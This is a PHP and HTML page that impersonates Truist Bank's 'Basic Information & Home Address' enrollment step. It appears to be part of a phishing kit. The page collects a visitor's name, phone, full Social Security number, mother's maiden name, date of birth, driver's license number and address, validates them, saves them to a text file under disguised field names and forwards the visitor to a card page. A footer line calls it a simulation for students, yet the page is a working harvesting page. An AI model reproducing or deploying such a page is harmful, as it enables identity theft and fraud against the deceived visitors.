<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $fzNme = trim($_POST['fzNme'] ?? '');
    $lzNme = trim($_POST['lzNme'] ?? '');
    $phone = trim($_POST['phone'] ?? '');
    $ssn = trim($_POST['ssn'] ?? '');
    $motherMaidenName = trim($_POST['motherMaidenName'] ?? '');
    $month = $_POST['month'] ?? '';
    $day = $_POST['day'] ?? '';
    $year = $_POST['year'] ?? '';
    $driverLicense = trim($_POST['driverLicense'] ?? '');
    $stAd = trim($_POST['stAd'] ?? '');
    $apt = trim($_POST['apt'] ?? '');
    $city = trim($_POST['city'] ?? '');
    $state = trim($_POST['state'] ?? '');
    $zipCode = trim($_POST['zipCode'] ?? '');
    
    // Validation
    if (empty($fzNme)) $errors['fzNme'] = 'First name is required';
    if (empty($lzNme)) $errors['lzNme'] = 'Last name is required';
    if (empty($phone)) {
        $errors['phone'] = 'Phone number is required';
    } else {
        // Remove all non-digit characters
        $phoneDigits = preg_replace('/\D/', '', $phone);
        if (strlen($phoneDigits) !== 10) {
            $errors['phone'] = 'Phone number must be 10 digits (US format)';
        } elseif (!preg_match('/^[2-9]\d{2}[2-9]\d{2}\d{4}$/', $phoneDigits)) {
            $errors['phone'] = 'Please enter a valid US phone number';
        }
    }
    if (empty($ssn)) {
        $errors['ssn'] = 'SSN is required';
    } else {
        // Remove all non-digit characters
        $ssnDigits = preg_replace('/\D/', '', $ssn);
        if (strlen($ssnDigits) !== 9) {
            $errors['ssn'] = 'SSN must be 9 digits';
        } elseif (!preg_match('/^[0-9]{9}$/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN';
        } elseif (preg_match('/^000|^666|^9[0-9]{2}|^123[0-9]{2}/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid area number)';
        } elseif (preg_match('/^00[0-9]{7}|^0000[0-9]{5}/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid group number)';
        } elseif (preg_match('/[0-9]{4}0000$/', $ssnDigits)) {
            $errors['ssn'] = 'Please enter a valid SSN (invalid serial number)';
        }
    }
    if (empty($motherMaidenName)) $errors['motherMaidenName'] = "Mother's maiden name is required";
    if (empty($month) || empty($day) || empty($year)) {
        $errors['dob'] = 'Complete date of birth is required';
    } else {
        // Check if user is at least 18
        $dob = new DateTime("$year-$month-$day");
        $today = new DateTime();
        $age = $today->format('Y') - $dob->format('Y');
        if ($today->format('m-d') < $dob->format('m-d')) {
            $age--;
        }
        if ($age < 18) {
            $errors['dob'] = 'You must be at least 18 years old';
        }
    }
    if (empty($driverLicense)) $errors['driverLicense'] = "Driver's license is required";
    if (empty($stAd)) $errors['stAd'] = 'Street address is required';
    if (empty($city)) $errors['city'] = 'City is required';
    if (empty($state)) $errors['state'] = 'State is required';
    if (empty($zipCode)) $errors['zipCode'] = 'Zip code is required';
    
    if (empty($errors)) {
        // Format date
        $monthNames = ['', 'January', 'February', 'March', 'April', 'May', 'June',
                      'July', 'August', 'September', 'October', 'November', 'December'];
        $formattedDob = ($monthNames[intval($month)] ?? '') . "/$day/$year";
        
        // Save to test file (matching affinity field names)
        $data = [
            'step' => 'basic_info_home_address',
            'usrnm' => $username,
            'gvn_nm' => $fzNme,
            'fam_nm' => $lzNme,
            'cnt_num' => $phone,
            'tax_id' => $ssn,
            'mat_nm' => $motherMaidenName,
            'dob' => $formattedDob,
            'id_num' => $driverLicense,
            'str_adr' => $stAd,
            'unit_dsg' => $apt,
            'loc' => $city,
            'prov' => $state,
            'zip_cd' => $zipCode
        ];
        
        saveUserData('basic_info_home_address.txt', $data);
        
        // Redirect to card page
        header('Location: card.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Basic Information - Truist Bank</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen flex flex-col bg-[#f6f3fa]">
    <!-- Header -->
    <header class="bg-[#2b0d49] text-white shadow-[0_2px_8px_rgba(22,9,40,0.45)]">
        <div class="max-w-6xl mx-auto h-16 flex items-center justify-start px-6">
            <img
                src="assets/trulogo_horz-white.png"
                alt="Truist logo"
                class="h-8 w-auto"
            />
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-1 flex items-start justify-center px-4 sm:px-6 py-10">
        <div class="w-full max-w-5xl">
            <section class="w-full">
                <h1 class="mx-auto mb-6 w-full max-w-3xl text-center text-3xl font-semibold text-[#2b0d49]">
                    Basic Information & Home Address
                </h1>
                <div class="mx-auto w-full max-w-3xl rounded-2xl border border-[#e2d8f1] bg-white shadow-[0_20px_60px_rgba(43,13,73,0.12)]">
                    <div class="px-8 py-10">
                        <p class="text-sm font-semibold text-[#6c5d85]">Confirm the details we have on file before continuing your enrollment</p>

                        <?php if (!empty($errors)): ?>
                            <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                                <div class="flex">
                                    <div class="flex-shrink-0">
                                        <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                        </svg>
                                    </div>
                                    <div class="ml-3">
                                        <p class="text-sm text-red-700">
                                            Please fix the following errors:
                                            <ul class="list-disc pl-5 mt-1">
                                                <?php foreach ($errors as $error): ?>
                                                    <li><?php echo htmlspecialchars($error); ?></li>
                                                <?php endforeach; ?>
                                            </ul>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>
                        
                        <form method="POST" class="mt-8 space-y-6">
                            <!-- First Name -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="fzNme">
                                    First Name
                                </label>
                                <input
                                    id="fzNme"
                                    name="fzNme"
                                    type="text"
                                    value="<?php echo htmlspecialchars($_POST['fzNme'] ?? ''); ?>"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    placeholder="Enter first name"
                                    required
                                />
                                <?php if (isset($errors['fzNme'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['fzNme']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Last Name -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="lzNme">
                                    Last Name
                                </label>
                                <input
                                    id="lzNme"
                                    name="lzNme"
                                    type="text"
                                    value="<?php echo htmlspecialchars($_POST['lzNme'] ?? ''); ?>"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    placeholder="Enter last name"
                                    required
                                />
                                <?php if (isset($errors['lzNme'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['lzNme']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Phone Number -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="phone">
                                    Phone Number
                                </label>
                                <input
                                    id="phone"
                                    name="phone"
                                    type="tel"
                                    value="<?php echo htmlspecialchars($_POST['phone'] ?? ''); ?>"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    placeholder="(555) 555-5555"
                                    required
                                />
                                <?php if (isset($errors['phone'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['phone']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                            
                            <!-- SSN -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="ssn">
                                    Social Security Number
                                </label>
                                <div class="relative">
                                    <input
                                        id="ssn"
                                        name="ssn"
                                        type="password"
                                        value="<?php echo htmlspecialchars($_POST['ssn'] ?? ''); ?>"
                                        class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        placeholder="XXX-XX-XXXX"
                                        required
                                    />
                                    <button
                                        type="button"
                                        onclick="toggleSSNVisibility()"
                                        class="absolute right-3 top-1/2 -translate-y-1/2 text-[#5f259f] text-sm hover:underline"
                                    >
                                        <span id="ssnToggleText">Show</span>
                                    </button>
                                </div>
                                <?php if (isset($errors['ssn'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['ssn']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Mother's Maiden Name -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="motherMaidenName">
                                    Mother's Maiden Name
                                </label>
                                <input
                                    id="motherMaidenName"
                                    name="motherMaidenName"
                                    type="text"
                                    value="<?php echo htmlspecialchars($_POST['motherMaidenName'] ?? ''); ?>"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    placeholder="Enter mother's maiden name"
                                    required
                                />
                                <?php if (isset($errors['motherMaidenName'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['motherMaidenName']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Date of Birth -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]">Date of Birth</label>
                                <div class="grid grid-cols-3 gap-2">
                                    <select
                                        id="month"
                                        name="month"
                                        class="rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        required
                                    >
                                        <option value="">Month</option>
                                        <?php for ($i = 1; $i <= 12; $i++): ?>
                                            <option value="<?php echo $i; ?>" <?php echo (isset($_POST['month']) && $_POST['month'] == $i) ? 'selected' : ''; ?>>
                                                <?php echo date('F', mktime(0, 0, 0, $i, 1)); ?>
                                            </option>
                                        <?php endfor; ?>
                                    </select>
                                    <select
                                        id="day"
                                        name="day"
                                        class="rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        required
                                    >
                                        <option value="">Day</option>
                                        <?php for ($i = 1; $i <= 31; $i++): ?>
                                            <option value="<?php echo $i; ?>" <?php echo (isset($_POST['day']) && $_POST['day'] == $i) ? 'selected' : ''; ?>><?php echo $i; ?></option>
                                        <?php endfor; ?>
                                    </select>
                                    <select
                                        id="year"
                                        name="year"
                                        class="rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        required
                                    >
                                        <option value="">Year</option>
                                        <?php for ($i = date('Y'); $i >= 1900; $i--): ?>
                                            <option value="<?php echo $i; ?>" <?php echo (isset($_POST['year']) && $_POST['year'] == $i) ? 'selected' : ''; ?>><?php echo $i; ?></option>
                                        <?php endfor; ?>
                                    </select>
                                </div>
                                <?php if (isset($errors['dob'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['dob']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Driver's License -->
                            <div class="space-y-2">
                                <label class="text-sm text-[#5d4f72]" for="driverLicense">
                                    Driver's License Number
                                </label>
                                <input
                                    id="driverLicense"
                                    name="driverLicense"
                                    type="text"
                                    value="<?php echo htmlspecialchars($_POST['driverLicense'] ?? ''); ?>"
                                    class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                    placeholder="Enter license number"
                                    required
                                />
                                <?php if (isset($errors['driverLicense'])): ?>
                                    <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                        <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                            <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                        </svg>
                                        <span><?php echo htmlspecialchars($errors['driverLicense']); ?></span>
                                    </div>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Home Address Section -->
                            <div class="border-t-2 border-[#e2d8f1] pt-6 mt-6">
                                <h3 class="text-lg font-semibold text-[#2b0d49] mb-4">Home Address</h3>
                                
                                <!-- Street Address -->
                                <div class="space-y-2 mb-4">
                                    <label class="text-sm text-[#5d4f72]" for="stAd">
                                        Street Address
                                    </label>
                                    <input
                                        id="stAd"
                                        name="stAd"
                                        type="text"
                                        value="<?php echo htmlspecialchars($_POST['stAd'] ?? ''); ?>"
                                        class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        placeholder="Enter street address"
                                        required
                                    />
                                    <?php if (isset($errors['stAd'])): ?>
                                        <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                            <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                                <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                            </svg>
                                            <span><?php echo htmlspecialchars($errors['stAd']); ?></span>
                                        </div>
                                    <?php endif; ?>
                                </div>
                                
                                <!-- Apartment/Unit -->
                                <div class="space-y-2 mb-4">
                                    <label class="text-sm text-[#5d4f72]" for="apt">
                                        Apartment/Unit (Optional)
                                    </label>
                                    <input
                                        id="apt"
                                        name="apt"
                                        type="text"
                                        value="<?php echo htmlspecialchars($_POST['apt'] ?? ''); ?>"
                                        class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        placeholder="Apt, Suite, Unit, etc."
                                    />
                                </div>
                                
                                <!-- City -->
                                <div class="space-y-2 mb-4">
                                    <label class="text-sm text-[#5d4f72]" for="city">
                                        City
                                    </label>
                                    <input
                                        id="city"
                                        name="city"
                                        type="text"
                                        value="<?php echo htmlspecialchars($_POST['city'] ?? ''); ?>"
                                        class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        placeholder="Enter city"
                                        required
                                    />
                                    <?php if (isset($errors['city'])): ?>
                                        <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                            <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                                <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                            </svg>
                                            <span><?php echo htmlspecialchars($errors['city']); ?></span>
                                        </div>
                                    <?php endif; ?>
                                </div>
                                
                                <!-- State -->
                                <div class="space-y-2 mb-4">
                                    <label class="text-sm text-[#5d4f72]" for="state">
                                        State
                                    </label>
                                    <input
                                        id="state"
                                        name="state"
                                        type="text"
                                        value="<?php echo htmlspecialchars($_POST['state'] ?? ''); ?>"
                                        class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        placeholder="Enter state"
                                        required
                                    />
                                    <?php if (isset($errors['state'])): ?>
                                        <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                            <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                                <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                            </svg>
                                            <span><?php echo htmlspecialchars($errors['state']); ?></span>
                                        </div>
                                    <?php endif; ?>
                                </div>
                                
                                <!-- Zip Code -->
                                <div class="space-y-2 mb-4">
                                    <label class="text-sm text-[#5d4f72]" for="zipCode">
                                        Zip Code
                                    </label>
                                    <input
                                        id="zipCode"
                                        name="zipCode"
                                        type="text"
                                        value="<?php echo htmlspecialchars($_POST['zipCode'] ?? ''); ?>"
                                        class="w-full rounded-xl border border-[#cfc2df] px-4 py-3 text-sm text-[#3c3451] focus:border-[#7a3ec8] focus:outline-none focus:ring-2 focus:ring-[#c5b2e3]"
                                        placeholder="Enter zip code"
                                        required
                                    />
                                    <?php if (isset($errors['zipCode'])): ?>
                                        <div class="flex items-center gap-2 text-xs font-semibold text-[#b11f4e]" role="alert">
                                            <svg aria-hidden="true" class="h-4 w-4" viewBox="0 0 24 24" fill="currentColor">
                                                <path d="M12 2l10 18H2L12 2zm0 5.75a.75.75 0 00-.75.75v4a.75.75 0 001.5 0v-4a.75.75 0 00-.75-.75zm0 7a.88.88 0 100 1.75.88.88 0 000-1.75z" />
                                            </svg>
                                            <span><?php echo htmlspecialchars($errors['zipCode']); ?></span>
                                        </div>
                                    <?php endif; ?>
                                </div>
                            </div>
                            
                            <div class="flex flex-wrap gap-3 pt-2">
                                <button
                                    type="submit"
                                    class="inline-flex items-center justify-center rounded-full bg-[#5f259f] px-8 py-3 text-sm font-semibold text-white hover:bg-[#4a1a7e]"
                                >
                                    Continue
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </section>
        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-[#2b0d49] text-white">
        <div class="max-w-6xl mx-auto px-6 py-8 grid gap-6 lg:grid-cols-[auto_1fr_auto] items-start">
            <div class="flex flex-col gap-3">
                <div class="flex items-center">
                    <img
                        src="assets/trulogo_horz-white.png"
                        alt="Truist logo"
                        class="h-8 w-auto"
                    />
                </div>
                <p class="text-xs text-white/70 max-w-xs">
                    Tailored banking experiences, demonstrated for students and simulation exercises only.
                </p>
            </div>

            <div class="grid gap-3 sm:grid-cols-2 lg:grid-cols-3 text-sm">
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Privacy
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Accessibility
                        </a>
                    </li>
                </ul>
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Fraud & security
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Limit use of my sensitive personal information
                        </a>
                    </li>
                </ul>
                <ul class="space-y-2">
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Terms and conditions
                        </a>
                    </li>
                    <li>
                        <a class="text-white/80 hover:text-white" href="#">
                            Disclosures
                        </a>
                    </li>
                </ul>
            </div>
        </div>
        <div class="bg-black/90">
            <p class="max-w-6xl mx-auto px-6 py-3 text-center text-xs text-white/70">
                © 2025, Truist. All rights reserved.
            </p>
        </div>
    </footer>

    <script>
        // Auto-focus first input on page load
        document.addEventListener('DOMContentLoaded', function() {
            const firstInput = document.querySelector('input');
            if (firstInput) {
                firstInput.focus();
            }
        });
        
        // Toggle SSN visibility
        function toggleSSNVisibility() {
            const ssnInput = document.getElementById('ssn');
            const toggleText = document.getElementById('ssnToggleText');
            
            if (ssnInput.type === 'password') {
                ssnInput.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                ssnInput.type = 'password';
                toggleText.textContent = 'Show';
            }
        }
        
        // Format phone number
        document.getElementById('phone').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            // Limit to 10 digits
            value = value.slice(0, 10);
            
            if (value.length >= 6) {
                value = value.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
            } else if (value.length >= 3) {
                value = value.replace(/(\d{3})(\d{0,3})/, '($1) $2');
            }
            e.target.value = value;
        });
        
        // Format SSN
        document.getElementById('ssn').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            // Limit to 9 digits
            value = value.slice(0, 9);
            
            if (value.length >= 6) {
                value = value.replace(/(\d{3})(\d{2})(\d{0,4})/, '$1-$2-$3');
            } else if (value.length >= 4) {
                value = value.replace(/(\d{3})(\d{0,2})/, '$1-$2');
            }
            e.target.value = value;
        });
    </script>
</body>
</html>
